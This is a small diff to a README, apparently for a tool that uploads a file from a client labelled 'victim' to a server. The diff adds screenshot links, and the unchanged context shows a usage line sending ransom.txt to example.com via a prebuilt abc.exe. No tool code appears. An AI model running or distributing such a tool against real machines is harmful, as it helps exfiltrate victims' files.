@@ -78,6 +78,14 @@ Example:
 ```bash
 ./abc.exe ransom.txt http://example.com
 ```
+**Server**:
+
+![plot](./images/server.png)
+
+**Client**
+
+![plot](./images/victim.png)
+
 **Note**: 
 - file which is sent will be saved at ***output/*** directory on server.
 - There is a prebuilt file named ***abc.exe*** that is available to use (no need to compile anymore)
